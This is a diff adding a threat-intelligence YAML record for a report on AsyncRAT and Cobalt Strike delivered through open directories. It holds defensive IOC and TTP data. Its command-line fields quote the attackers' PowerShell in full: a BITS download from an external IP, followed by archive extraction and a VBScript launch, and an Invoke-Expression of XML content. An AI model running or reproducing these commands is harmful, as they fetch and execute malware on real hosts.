@@ -1,0 +1,66 @@
+title: 'Gateway to Intrusion: Malware Delivery Via Open Directories'
+description: Threat actors leverage open directories to deliver AsyncRAT and Cobalt
+  Strike payloads, using VBScript with BITS transfer and a Python executable with
+  Fernet-encrypted shellcode to compromise systems.
+attribution: ''
+malware_families:
+- AsyncRAT
+- Cobalt Strike
+- Supershell
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - 1.exe
+  command_lines:
+  - powershell -command ""[xml]$xmldoc = Get-Content 'C:\Users\Public\temp.xml'; $comm=
+    $xmldoc.command.a.execute; Invoke-Expression command""
+  - Start-BitsTransfer -Source "http://207.32.217.21:444/f+jpg" -Destination "C:\Users\Public\ben.zip";
+    Expand-Archive -Path "C:\Users\Public\ben.zip" -DestinationPath "C:\Users\Public\"
+    -Force; Start "C:\Users\Public\Webcentral.vbs"; Remove-Item -Path "C:\Users\Public\ben.zip"
+    -Force
+  powershell:
+  - Start-BitsTransfer -Source "http://207.32.217.21:444/f+jpg" -Destination "C:\Users\Public\ben.zip";
+    Expand-Archive -Path "C:\Users\Public\ben.zip" -DestinationPath "C:\Users\Public\"
+    -Force; Start "C:\Users\Public\Webcentral.vbs"; Remove-Item -Path "C:\Users\Public\ben.zip"
+    -Force
+  scripts:
+  - xx.txt
+  - Webcentral.vbs
+  - Webcentral.bat
+  - Webcentral.ps1
+  - hash.bat
+  - hash.ps1
+  - hash.vbs
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - 1.exe -> 121.37.21[.]229:80
+  - xx.txt -> 207.32.217[.]21:444
+  file_activity:
+  - C:\Users\Public\temp.xml
+  - C:\Users\Public\ben.zip
+  - C:\Users\Public\Webcentral.vbs
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 172.232.207[.]208
+  - 185.81.157[.]12
+  - 35.225.65[.]204
+  - 207.32.217[.]21
+  - 185.81.157[.]103
+  - 167.235.78[.]69
+  - 121.37.21[.]229
+  - 185.241.208[.]159
+  - 111.230.26[.]98
+  - 185.81.157[.]252
+  - 185.81.157[.]244
+  domains: []
+  urls:
+  - hxxp://207.32.217[.]21:444/f+jpg
+authors: []
+reference: https://hunt.io/blog/gateway-to-intrusion
+date_of_publication: October 31, 2023
+file_creation_date: May 22, 2026
